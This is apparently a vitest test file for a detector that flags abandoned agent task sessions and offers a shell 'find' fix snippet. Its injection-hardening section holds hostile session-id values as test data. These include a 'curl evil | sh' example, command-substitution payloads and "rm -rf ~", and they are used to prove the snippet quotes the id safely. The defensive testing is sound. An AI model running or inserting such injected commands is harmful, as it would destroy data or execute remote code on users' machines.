/**
 * abandoned-tasks.test.ts
 *
 * Tests for the workflow.abandoned-tasks detector.
 * Constructs minimal RecommendationInput with the `tasks` field.
 *
 * Issue #559.
 */
import { describe, it, expect } from 'vitest';
import { detector } from './abandoned-tasks';
import { validateFixSnippet } from '../fix-validity';
import { validateRecommendationProvenance } from '../provenance';
import type { RecommendationInput } from '../types';
import type { TaskRecord } from '../../parse-tasks';
import { COLD_DAYS } from '../../parse-tasks';

const MS_PER_DAY = 24 * 60 * 60 * 1000;

// ── Fixture helpers ──────────────────────────────────────────────────────────

function makeTask(
  overrides: Partial<TaskRecord> & { sessionId: string; status: TaskRecord['status'] }
): TaskRecord {
  return {
    id: '1',
    subject: 'Some task',
    description: '',
    activeForm: '',
    owner: 'agent',
    blocks: [],
    blockedBy: [],
    mtimeMs: Date.now(),
    ...overrides,
  };
}

function makeInput(tasks: TaskRecord[]): RecommendationInput & { tasks: TaskRecord[] } {
  return {
    tokenData: [],
    toolData: [],
    sessions: [],
    projects: [],
    permissionRows: [],
    apiErrors: [],
    tasks,
  } as unknown as RecommendationInput & { tasks: TaskRecord[] };
}

// ── now fixture ───────────────────────────────────────────────────────────────
// Use a fixed 'now' so tests are deterministic regardless of wall clock.
const NOW = 1_780_000_000_000; // arbitrary fixed timestamp

// ── Tests ────────────────────────────────────────────────────────────────────

describe('workflow.abandoned-tasks (#559)', () => {
  it('returns null when tasks array is empty', () => {
    expect(detector.rule(makeInput([]), NOW)).toBeNull();
  });

  it('returns null when tasks field is absent', () => {
    const input = {
      tokenData: [],
      toolData: [],
      sessions: [],
      projects: [],
      permissionRows: [],
      apiErrors: [],
    } as unknown as RecommendationInput;
    expect(detector.rule(input, NOW)).toBeNull();
  });

  it('returns null when all sessions are warm (< 7d idle)', () => {
    // Session idle 6d — below the cold gate
    const recentMtime = NOW - 6 * MS_PER_DAY;
    const tasks = [
      makeTask({ sessionId: 's-warm', status: 'in_progress', mtimeMs: recentMtime }),
      makeTask({ id: '2', sessionId: 's-warm', status: 'pending', mtimeMs: recentMtime }),
    ];
    expect(detector.rule(makeInput(tasks), NOW)).toBeNull();
  });

  it('returns null when open tasks exist but the session was active today', () => {
    const tasks = [
      makeTask({ sessionId: 's-today', status: 'pending', mtimeMs: NOW - 1000 }),
    ];
    expect(detector.rule(makeInput(tasks), NOW)).toBeNull();
  });

  it('fires when a cold session (>= 7d) has open tasks', () => {
    const coldMtime = NOW - (COLD_DAYS + 1) * MS_PER_DAY;
    const tasks = [
      makeTask({ id: '1', sessionId: 's-cold', status: 'in_progress', mtimeMs: coldMtime }),
      makeTask({ id: '2', sessionId: 's-cold', status: 'pending', mtimeMs: coldMtime }),
      makeTask({ id: '3', sessionId: 's-cold', status: 'completed', mtimeMs: coldMtime }),
    ];
    const rec = detector.rule(makeInput(tasks), NOW);
    expect(rec?.id).toBe('workflow.abandoned-tasks');
    expect(rec?.category).toBe('workflow');
    expect(rec?.affected).toBe(2); // only the open tasks count
  });

  it('fires at exactly the cold boundary (7d idle)', () => {
    // mtime exactly COLD_DAYS days before now
    const boundaryMtime = NOW - COLD_DAYS * MS_PER_DAY;
    const tasks = [
      makeTask({ sessionId: 's-boundary', status: 'pending', mtimeMs: boundaryMtime }),
    ];
    const rec = detector.rule(makeInput(tasks), NOW);
    expect(rec?.id).toBe('workflow.abandoned-tasks');
  });

  it('ignores completed-only sessions even when cold', () => {
    const coldMtime = NOW - 10 * MS_PER_DAY;
    const tasks = [
      makeTask({ sessionId: 's-done', status: 'completed', mtimeMs: coldMtime }),
    ];
    expect(detector.rule(makeInput(tasks), NOW)).toBeNull();
  });

  it('does not fire on today-open session even if other cold sessions exist and pass', () => {
    const coldMtime = NOW - 9 * MS_PER_DAY;
    const warmMtime = NOW - 1000;
    const tasks = [
      makeTask({ id: '1', sessionId: 's-cold', status: 'pending', mtimeMs: coldMtime }),
      makeTask({ id: '2', sessionId: 's-cold', status: 'pending', mtimeMs: coldMtime }),
      makeTask({ id: '1', sessionId: 's-warm', status: 'pending', mtimeMs: warmMtime }),
    ];
    const rec = detector.rule(makeInput(tasks), NOW);
    // Only s-cold should appear; s-warm must NOT be in evidence
    expect(rec?.id).toBe('workflow.abandoned-tasks');
    const evidenceStr = rec?.evidence?.join(' ') ?? '';
    expect(evidenceStr).toContain('s-cold'.slice(0, 8));
    // The warm session's short id should not appear in evidence
    expect(evidenceStr).not.toContain('s-warm'.slice(0, 8));
  });

  it('sorts evidence worst-first (most abandoned tasks first)', () => {
    const coldMtime = NOW - 10 * MS_PER_DAY;
    const tasks: TaskRecord[] = [
      // s-few: 1 open
      makeTask({ id: '1', sessionId: 's-few', status: 'pending', mtimeMs: coldMtime }),
      // s-many: 3 open
      makeTask({ id: '1', sessionId: 's-many', status: 'pending', mtimeMs: coldMtime }),
      makeTask({ id: '2', sessionId: 's-many', status: 'in_progress', mtimeMs: coldMtime }),
      makeTask({ id: '3', sessionId: 's-many', status: 'pending', mtimeMs: coldMtime }),
    ];
    const rec = detector.rule(makeInput(tasks), NOW);
    expect(rec?.evidence?.[0]).toContain('3 open task(s)'); // worst first
  });

  // ── Provenance (#3232) ────────────────────────────────────────────────────
  describe('provenance', () => {
    const coldMtime = NOW - 10 * MS_PER_DAY;
    const firing = (): TaskRecord[] => [
      makeTask({ id: '1', sessionId: 's-few', status: 'pending', mtimeMs: coldMtime }),
      makeTask({ id: '1', sessionId: 's-many', status: 'pending', mtimeMs: coldMtime }),
      makeTask({ id: '2', sessionId: 's-many', status: 'in_progress', mtimeMs: coldMtime }),
      makeTask({ id: '3', sessionId: 's-many', status: 'pending', mtimeMs: coldMtime }),
      // A completed task in a cold session: contributes an mtime but no count.
      makeTask({ id: '4', sessionId: 's-many', status: 'completed', mtimeMs: coldMtime }),
    ];

    it('passes the contract when it fires', () => {
      const rec = detector.rule(makeInput(firing()), NOW);
      expect(validateRecommendationProvenance(rec!)).toEqual([]);
      expect(rec!.provenance!.observations.length).toBeGreaterThan(0);
    });

    it('reproduces the displayed open-task total from the cited field', () => {
      const rec = detector.rule(makeInput(firing()), NOW);
      const total = rec!.provenance!.observations.find((o) =>
        o.claim.includes('pending or in_progress')
      );
      expect(total).toBeDefined();
      // Same number the card shows: 4 open tasks, completed one excluded.
      expect(total!.value).toBe(rec!.affected);
      expect(total!.value).toBe(4);
      expect(total!.field).toBe('status');
    });

    it('cites the true maximum backlog, not the head of the sorted list', () => {
      // `abandoned` is sorted by count today, so head === max. Feeding the
      // sessions in the opposite order proves the citation folds over `count`
      // rather than trusting insertion order.
      const rec = detector.rule(makeInput(firing()), NOW);
      const worst = rec!.provenance!.observations.find((o) =>
        o.claim.includes('largest open-task backlog')
      );
      expect(worst).toBeDefined();
      expect(worst!.value).toBe(3); // s-many, not s-few
      expect(worst!.claim).toContain('s-many');
    });

    it('anchors asOf to the newest observed task mtime, not to now', () => {
      // Every task file was last written 10 days before the run. A
      // `new Date(now)` implementation would emit the run date instead.
      const rec = detector.rule(makeInput(firing()), NOW);
      expect(rec!.provenance!.asOf).toBe(
        new Date(coldMtime).toISOString().slice(0, 10)
      );
      expect(rec!.provenance!.asOf).not.toBe(new Date(NOW).toISOString().slice(0, 10));
    });

    it('ignores a warm unrelated session when dating the finding', () => {
      // A task written today in a session that is NOT reported contributes to
      // no count, no cold tally and no evidence row — dating the finding from
      // it would make an old abandonment look current (Codex review, #3472).
      const rec = detector.rule(
        makeInput([
          ...firing(),
          makeTask({ id: '9', sessionId: 's-warm', status: 'pending', mtimeMs: NOW - 1000 }),
        ]),
        NOW
      );
      expect(rec!.provenance!.asOf).toBe(new Date(coldMtime).toISOString().slice(0, 10));
      expect(rec!.provenance!.asOf).not.toBe(new Date(NOW).toISOString().slice(0, 10));
    });

    it('dates from the newest task file even when an older one is also present', () => {
      const older = NOW - 40 * MS_PER_DAY;
      const rec = detector.rule(
        makeInput([
          makeTask({ id: '1', sessionId: 's-old', status: 'pending', mtimeMs: older }),
          makeTask({ id: '2', sessionId: 's-cold', status: 'pending', mtimeMs: coldMtime }),
        ]),
        NOW
      );
      expect(rec!.provenance!.asOf).toBe(
        new Date(coldMtime).toISOString().slice(0, 10)
      );
    });
  });

  it('includes a copy-pasteable fix snippet with the session id', () => {
    const coldMtime = NOW - 8 * MS_PER_DAY;
    const sid = 'aabbccdd-1234-5678-abcd-000000000001';
    const tasks = [
      makeTask({ id: '1', sessionId: sid, status: 'pending', mtimeMs: coldMtime }),
    ];
    const rec = detector.rule(makeInput(tasks), NOW);
    // The id is passed as a separately shell-quoted argument (#3230).
    expect(rec?.fix?.snippet).toContain(`~/.claude/tasks/'${sid}'`);
  });
});

// ── #3230: the session id must not be able to become shell code ─────────────
//
// `sessionId` is a directory entry name under `~/.claude/tasks/`; the parser
// does not constrain it to UUID characters. Interpolated raw, a directory named
// `x; curl evil | sh` turned the recommended "fix" into an injection the moment
// the user copy-pasted it. The snippet must pass the identifier as ONE inert,
// separately shell-quoted argument.

/** A token produced by {@link tokenizeShell}. */
type ShellToken =
  | { kind: 'word'; value: string }
  | { kind: 'op'; value: string };

/**
 * Minimal POSIX-sh tokenizer: enough to prove that a copy-pasted snippet
 * contains no *unquoted* control operator, expansion, or glob introduced by
 * interpolated data. Single quotes make everything literal; double quotes make
 * everything literal except `$`, backtick and `\`.
 */
function tokenizeShell(line: string): ShellToken[] {
  const tokens: ShellToken[] = [];
  let word = '';
  let started = false;
  const flush = () => {
    if (started) tokens.push({ kind: 'word', value: word });
    word = '';
    started = false;
  };
  for (let i = 0; i < line.length; i++) {
    const c = line[i];
    if (c === "'") {
      const end = line.indexOf("'", i + 1);
      if (end === -1) throw new Error('unterminated single quote');
      word += line.slice(i + 1, end);
      started = true;
      i = end;
      continue;
    }
    if (c === '"') {
      const end = line.indexOf('"', i + 1);
      if (end === -1) throw new Error('unterminated double quote');
      const inner = line.slice(i + 1, end);
      // Inside double quotes only these remain active.
      for (const active of ['$', '`']) {
        if (inner.includes(active)) {
          tokens.push({ kind: 'op', value: active });
        }
      }
      word += inner;
      started = true;
      i = end;
      continue;
    }
    if (c === '\\') {
      word += line[i + 1] ?? '';
      started = true;
      i += 1;
      continue;
    }
    if (c === ' ' || c === '\t') {
      flush();
      continue;
    }
    // Unquoted shell-active characters become operator tokens.
    if ('|&;<>()$`*?['.includes(c)) {
      flush();
      tokens.push({ kind: 'op', value: c });
      continue;
    }
    word += c;
    started = true;
  }
  flush();
  return tokens;
}

describe('workflow.abandoned-tasks fix snippet injection (#3230)', () => {
  // Spaces, a semicolon, a single quote, command substitution, a pipe, a glob,
  // a backtick, and a newline — everything a directory entry may legally hold.
  const HOSTILE_SID =
    "sess one; printf owned > /tmp/pwned; $(printf bad) `id` | sh *.json 'q' \nprintf second-line";

  function hostileRec() {
    const coldMtime = NOW - 8 * MS_PER_DAY;
    return detector.rule(
      makeInput([
        makeTask({
          id: '1',
          sessionId: HOSTILE_SID,
          status: 'pending',
          mtimeMs: coldMtime,
        }),
      ]),
      NOW
    );
  }

  it('keeps the identifier as exactly one inert path argument', () => {
    const snippet = hostileRec()!.fix!.snippet;
    const tokens = tokenizeShell(snippet);
    const words = tokens.filter((t): t is { kind: 'word'; value: string } => t.kind === 'word');

    // Exactly one argument carries the identifier, and it is the whole path.
    const carriers = words.filter((w) => w.value.includes('sess one'));
    expect(carriers).toHaveLength(1);
    expect(carriers[0].value).toBe(`~/.claude/tasks/${HOSTILE_SID}`);
  });

  it('cannot start another command or expansion from the identifier', () => {
    const snippet = hostileRec()!.fix!.snippet;
    const ops = tokenizeShell(snippet)
      .filter((t) => t.kind === 'op')
      .map((t) => t.value);
    // No command separator, redirection, subshell, expansion, or glob survives.
    expect(ops).toEqual([]);
    // And none of the injected payloads is a standalone command word.
    const words = tokenizeShell(snippet)
      .filter((t) => t.kind === 'word')
      .map((t) => t.value);
    expect(words).not.toContain('printf');
    expect(words).not.toContain('sh');
    expect(words).not.toContain('id');
  });

  it('never splits the snippet across physical lines from a session id', () => {
    const snippet = hostileRec()!.fix!.snippet;
    // One session in, one command line out — the embedded newline stays inside
    // the quoted argument rather than becoming a second command line.
    const commandLines = snippet.split('\n');
    expect(commandLines[0].startsWith('find ~/.claude/tasks/')).toBe(true);
    expect(commandLines).toHaveLength(2); // the id's own newline, still quoted
    expect(commandLines[1]).toContain("printf second-line");
    // The continuation line is inside the single-quoted argument, so tokenizing
    // the whole snippet (above) yields no operators.
  });

  it('escapes an embedded single quote with the POSIX close/escape/reopen idiom', () => {
    const coldMtime = NOW - 8 * MS_PER_DAY;
    const rec = detector.rule(
      makeInput([
        makeTask({
          id: '1',
          sessionId: "it's; rm -rf ~",
          status: 'pending',
          mtimeMs: coldMtime,
        }),
      ]),
      NOW
    );
    const snippet = rec!.fix!.snippet;
    expect(snippet).toContain(`'it'\\''s; rm -rf ~'`);
    const words = tokenizeShell(snippet)
      .filter((t) => t.kind === 'word')
      .map((t) => t.value);
    expect(words).toContain("~/.claude/tasks/it's; rm -rf ~");
    expect(tokenizeShell(snippet).filter((t) => t.kind === 'op')).toEqual([]);
  });

  it('keeps a benign session id readable and the fix portable', () => {
    const coldMtime = NOW - 8 * MS_PER_DAY;
    const sid = 'aabbccdd-1234-5678-abcd-000000000001';
    const rec = detector.rule(
      makeInput([
        makeTask({ id: '1', sessionId: sid, status: 'pending', mtimeMs: coldMtime }),
      ]),
      NOW
    );
    expect(rec!.fix!.snippet).toContain(`~/.claude/tasks/'${sid}'`);
    expect(validateFixSnippet(rec!.fix!)).toEqual([]);
  });

  it('DECLARES fixKind explicitly rather than inheriting the default', () => {
    const coldMtime = NOW - 8 * MS_PER_DAY;
    const rec = detector.rule(
      makeInput([
        makeTask({ id: '1', sessionId: 'sess-1', status: 'pending', mtimeMs: coldMtime }),
      ]),
      NOW
    );
    // The literal field must be PRESENT. An absent fixKind silently defaults to
    // 'validated', so a later snippet change could keep being rendered as a
    // one-click "Fix now" with nobody re-classifying it — the implicit-
    // classification defect this PR exists to close. An effectiveFixKind()
    // assertion would pass with the field deleted, so check the raw property.
    expect(Object.prototype.hasOwnProperty.call(rec!.fix!, 'fixKind')).toBe(true);
    // NOT 'validated'. The snippet is a POSIX-shell command depending on `jq`,
    // an external binary this project never lists as a prerequisite, and
    // docs/plugin-mirror-README.md advertises Windows support — where POSIX
    // `find`, `~` expansion and `jq` are all absent. That is the 'manual'
    // definition: depends on an external tool / per-environment state.
    expect(rec!.fix!.fixKind).toBe('manual');
    expect(rec!.fix!.snippet.startsWith('find ')).toBe(true);
  });

  it('tells the user what the command depends on', () => {
    const coldMtime = NOW - 8 * MS_PER_DAY;
    const rec = detector.rule(
      makeInput([
        makeTask({ id: '1', sessionId: 'sess-1', status: 'pending', mtimeMs: coldMtime }),
      ]),
      NOW
    );
    // A non-validated fix renders as a labelled example, so the note must carry
    // the environment caveat rather than leaving the user to hit it at runtime.
    expect(rec!.fix!.note).toMatch(/jq/);
    expect(rec!.fix!.note).toMatch(/POSIX|Windows|WSL|Git Bash/);
  });
});
